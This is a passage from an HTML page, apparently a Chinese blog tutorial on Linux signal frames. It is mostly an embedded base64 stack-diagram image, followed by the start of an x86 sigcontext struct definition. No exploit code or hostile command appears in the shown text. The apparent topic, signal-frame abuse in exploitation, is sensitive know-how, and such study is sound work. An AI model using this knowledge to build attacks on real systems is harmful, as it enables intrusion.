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zJN9G+Fub6bJiKEpvDPKxei2xvFl21JS7Ew6L5lnKrVpMxv6DdMgqb2b53+QxO1ZtpiXkI9xJNq4eKCbG9KrOcAwGTE8hReHOrkg3SS1+nttRDAZOiSJaZ2qhuBOPRJ45Ax9PACEQiFeeeUV+vTpw6xZs/D5NKZYb+WbeOvp1/hkdSG1vzDhZ8dnzzDlnHO55Z1d9Zok59v2Mv95/vW8sKr6+5fv/uxRfnjuJOZ8W+eCZmmBDBpvbXURaUHGjx/PggULjj9eP7ULlq8ByhCCIfIPBckvszjsCVHs/64etluajSEZtloGvYZmsWdTKZcsOzHc2mdoCn8909Zoo8lBf5DcfUE2F4coCoDdbpCWZJLTzk7flKrrMDcYy6Jgv5/lB0OUGAZZHRyMbG/WfY3nZqDLDY+TfuEUABYvXszYsWPr/Bo5OTk8/PDDTJo0qaG717q40ulz9nCGDDqD7KxMunVqR5ukJNwO8Jcf5eCenWxZv4J//eMz1uz2VJ2XUEUKo1/eyuIpHSptX889fYfw+GYfmCmccfE1TL50OP26pmHzHqFwyyr+Ne9dPvpmv0op5DjVHItIfNlMenYw6Xm62w2F+GK9j4ruTr7f1owKnyFvkDdzI+sQDHLaNm6Zhc1hY1A3G4MasY2YDINuHZ1MqqkOU47bsmWLgnFD8B5i8/KP2Lz8o9PXZqiEbz9+kRkfv3j62pRmSeFYRFopi/xtHh5f5SGljY3B6TY6uQBfiHUFATZFDiO57ExQDa6ISKugcCwirV5JcZAlxdXNfDMYc66bc12ntUsiIhInCsciUi/OjCwsXzNeDDTkp1fWdjqsK2d/NbnYTE7ihjHduLOfu+aJg9IsODOy4t0FEWkGFI5FpF76PPhlvLtwyvoCtwaOkrdiOWvyd7N33wGKfA7adOjOGeeMYuTAzri1aIOISKuicCwirZs9jewRl5I9It4dERGRpkBjIiIiIiIiYVrnWERqJTU1ld69e8e7GyINorS0lE2bNsW7G9JgTBI79iSznTP6rpehCvbmb+eIFjGWOlA4FhEREREJU1mFiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhImMKxiIiIiEiYwrGIiIiISJjCsYiIiIhI2P8HCKTXCfFRUFoAAAAASUVORK5CYII=\" alt=\"signal2-stack\"></p>\n<p>对于signal Frame来说，不同会因为架构的不同而因此有所区别，这里给出分别给出x86以及x64的sigcontext</p>\n<p>x86</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> gs, __gsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> fs, __fsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> es, __esh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> ds, __dsh;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> edi;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esi;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> ebp;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> esp;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> ebx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> edx;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span 